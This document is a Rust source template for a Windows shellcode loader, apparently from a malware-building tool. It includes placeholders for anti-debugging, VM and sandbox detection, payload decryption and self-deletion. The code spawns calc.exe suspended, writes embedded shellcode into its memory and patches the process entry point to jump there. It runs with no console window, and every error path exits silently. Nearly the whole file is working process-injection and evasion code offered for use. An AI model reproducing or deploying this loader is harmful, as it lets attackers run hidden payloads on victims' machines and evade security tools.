#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use std::ffi::{c_char, c_void};
use std::mem::{size_of_val, zeroed};
use std::ptr::{addr_of, addr_of_mut, null, null_mut};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE, STATUS_SUCCESS, TRUE};
use windows_sys::Win32::System::Diagnostics::Debug::{
    ReadProcessMemory, WriteProcessMemory, IMAGE_FILE_HEADER, IMAGE_OPTIONAL_HEADER32,
    IMAGE_OPTIONAL_HEADER64,
};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::Threading::{
    CreateProcessA, NtQueryInformationProcess, ResumeThread, CREATE_SUSPENDED,
    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTF_USESTDHANDLES, STARTUPINFOA,
};
use std::include_bytes;

const X64: u16 = 0x8664_u16;
const X86: u16 = 0x14c_u16;
const MZ: u16 = 0x5a4d_u16;
const PE: u32 = 0x4550_u32;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let vec_size = vec.len();

    {{DEOBFUSCATION}}
    {{DECRYPTION}}

    let program = b"C:\\Windows\\System32\\calc.exe\0";

    #[repr(C)]
    struct Peb {
        reserved: [c_char; 0x10],
        image_base_address: *mut c_void,
    }

    unsafe {
        let mut process_info: PROCESS_INFORMATION = zeroed();

        let mut startup_info: STARTUPINFOA = zeroed();
        startup_info.dwFlags = STARTF_USESTDHANDLES | CREATE_SUSPENDED;
        startup_info.wShowWindow = 1;

        let res = CreateProcessA(
            program.as_ptr(),
            null_mut(),
            null(),
            null(),
            TRUE,
            CREATE_SUSPENDED,
            null(),
            null(),
            addr_of!(startup_info),
            addr_of_mut!(process_info),
        );
        if res == FALSE {
            //panic!("[-]CreateProcessA failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let addr = VirtualAllocEx(
            process_info.hProcess,
            null(),
            vec_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            //panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let res = WriteProcessMemory(
            process_info.hProcess,
            addr,
            vec.as_ptr().cast(),
            vec_size,
            null_mut(),
        );
        if res == FALSE {
            //panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let mut old = PAGE_READWRITE;
        let res = VirtualProtectEx(
            process_info.hProcess,
            addr,
            vec_size,
            PAGE_EXECUTE_READ,
            addr_of_mut!(old),
        );
        if res == FALSE {
            //panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let mut process_basic_info: PROCESS_BASIC_INFORMATION = zeroed();
        let res = NtQueryInformationProcess(
            process_info.hProcess,
            0,
            addr_of_mut!(process_basic_info).cast(),
            u32::try_from(size_of_val(&process_basic_info))
                //.expect("[-]u32::try_from failed!"),
                .unwrap(),
            null_mut(),
        );
        if res != STATUS_SUCCESS {
            //panic!("[-]NtQueryInformationProcess failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let read_process_memory = |addr: *const c_void, out: *mut c_void, size: usize| {
            let res = ReadProcessMemory(process_info.hProcess, addr, out, size, null_mut());
            if res == FALSE {
                //panic!("[-]ReadProcessMemory failed: {}!", GetLastError());
                std::process::exit(0);
            }
        };

        let mut peb: Peb = zeroed();
        read_process_memory(
            process_basic_info.PebBaseAddress.cast(),
            addr_of_mut!(peb).cast(),
            size_of_val(&peb),
        );

        let mut dos_header: IMAGE_DOS_HEADER = zeroed();
        read_process_memory(
            peb.image_base_address,
            addr_of_mut!(dos_header).cast(),
            size_of_val(&dos_header),
        );
        if dos_header.e_magic != MZ {
            //panic!("[-]DOS image header magic was not 0x5a4d!");
            std::process::exit(0);
        }

        let mut signature = 0u32;
        read_process_memory(
            ((peb.image_base_address as usize) + (dos_header.e_lfanew as usize)) as *const c_void,
            addr_of_mut!(signature).cast(),
            size_of_val(&signature),
        );
        if signature != PE {
            //panic!("[-]PE Signature was not 0x4550");
            std::process::exit(0);
        }

        let mut pe_header: IMAGE_FILE_HEADER = zeroed();
        read_process_memory(
            ((peb.image_base_address as usize)
                + (dos_header.e_lfanew as usize)
                + size_of_val(&signature)) as *const c_void,
            addr_of_mut!(pe_header).cast(),
            size_of_val(&pe_header),
        );

        let entrypoint;
        let mut ep_buffer = vec![];

        let read_opt_header = |header: *mut c_void, size: usize| {
            read_process_memory(
                ((peb.image_base_address as usize)
                    + (dos_header.e_lfanew as usize)
                    + size_of_val(&signature)
                    + size_of_val(&pe_header)) as *const c_void,
                header,
                size,
            );
        };

        match pe_header.Machine {
            X64 => {
                let mut opt_header: IMAGE_OPTIONAL_HEADER64 = zeroed();
                read_opt_header(addr_of_mut!(opt_header).cast(), size_of_val(&opt_header));

                entrypoint = ((peb.image_base_address as usize)
                    + usize::try_from(opt_header.AddressOfEntryPoint)
                    //.expect("[-]usize::try_from failed!"))
                    .unwrap())
                    as *mut c_void;

                // rex; mov eax
                ep_buffer.push(0x48_u8);
                ep_buffer.push(0xb8_u8);
                let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
                ep_buffer.append(&mut shellcode_addr);
            }
            X86 => {
                let mut opt_header: IMAGE_OPTIONAL_HEADER32 = zeroed();
                read_opt_header(addr_of_mut!(opt_header).cast(), size_of_val(&opt_header));

                entrypoint = ((peb.image_base_address as usize)
                    + usize::try_from(opt_header.AddressOfEntryPoint)
                    //.expect("[-]usize::try_from failed!"))
                    .unwrap())
                    as *mut c_void;

                // mov eax
                ep_buffer.push(0xb8_u8);
                let mut shellcode_addr = (addr as usize).to_le_bytes().to_vec();
                ep_buffer.append(&mut shellcode_addr);
            }
            _ => std::process::exit(0),
            /*
                panic!(
                "[-]Unknow IMAGE_OPTIONAL_HEADER type for machine type: {:#x}",
                pe_header.Machine),
                */
        }

        // jmp [r|e]ax
        ep_buffer.push(0xff_u8);
        ep_buffer.push(0xe0_u8);

        let res = WriteProcessMemory(
            process_info.hProcess,
            entrypoint,
            ep_buffer.as_ptr().cast(),
            ep_buffer.len(),
            null_mut(),
        );
        if res == FALSE {
            //panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let res = ResumeThread(process_info.hThread);
        if res == 0u32 {
            //panic!("[-]ResumeThread failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let res = CloseHandle(process_info.hProcess);
        if res == FALSE {
            //panic!("[-]CloseHandle failed: {}!", GetLastError());
            std::process::exit(0);
        }

        let res = CloseHandle(process_info.hThread);
        if res == FALSE {
            //panic!("[-]CloseHandle failed: {}!", GetLastError());
            std::process::exit(0);
        }
    }
}

{{DLL_MAIN}}